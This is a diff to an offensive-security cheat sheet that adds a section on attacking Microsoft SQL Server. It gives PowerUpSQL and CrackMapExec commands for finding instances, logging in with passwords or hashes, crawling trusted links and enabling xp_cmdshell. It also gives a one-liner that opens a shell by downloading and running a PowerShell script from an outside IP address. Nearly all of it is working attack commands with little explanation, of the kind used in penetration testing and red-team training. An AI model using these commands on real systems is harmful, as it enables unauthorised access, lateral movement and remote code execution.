@@ -131,14 +131,17 @@ namespace PowerShell_RunSpace
 }
 
 ```
-# Microsoft SQL Server Enumration using PowerUpSQL.ps1
 
-## Find MSSQL Servers in the current domain 
+# Attacking MSSQL 
+
+## Microsoft SQL Server Enumration using PowerUpSQL.ps1
+
+### Find MSSQL Servers in the current domain 
 ```
 Get-SQLInstanceDomain | Get-SQLConnectionTest
 ```
 
-## Crawl SQL Links
+### Crawl SQL Links
 
 ```
 Get-SQLServerLinkCrawl -Instance "SQL1.TARGET.LOCAL, 1433"
@@ -146,5 +149,75 @@ Get-SQLServerLinkCrawl -Instance "SQL1.TARGET.LOCAL, 1433"
 
 ```
 Get-SQLServerLinkCrawl -Instance "SQL1.TARGET.LOCAL, 1433" -Query "select * from master..syslogins" | ft
+```
+
+## Execute Commands
+
+### Using CrackMapExec 
+
+#### Execute CMD Command
+```bash
+crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami /all"
+```
+
+#### Execute Powershell Command using Username and HASH
+
+```bash
+crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
+```
+
+## Abuse MSSQL Trusted Links
+
+### Using PowerUpSQL.ps1
+
+```powershell
+Import-Module .\PowerupSQL.psd1
+
+#Get local MSSQL instance (if any)
+Get-SQLInstanceLocal
+Get-SQLInstanceLocal | Get-SQLServerInfo
+
+#If you don't have a AD account, you can try to find MSSQL scanning via UDP
+#First, you will need a list of hosts to scan
+Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10
+
+#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
+#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
+Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
+
+## FROM INSIDE OF THE DOMAIN
+#Get info about valid MSQL instances running in domain
+#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 
+
+#Test connections with each one
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
+
+#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+
+#Dump an instance (a lotof CVSs generated in current dir)
+Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
+
+#Look for MSSQL links of an accessible instance
+Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
+
+#Crawl trusted links, starting form the given one (the user being used by the MSSQL instance is also specified)
+Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose
+
+#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
+Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'
+
+#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
+Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"
+
+#Obtain a shell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
+
+#Check for possible vulnerabilities on an instance where you have access
+Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"
+
+#Try to escalate privileges on an instance
+Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
 ```
 
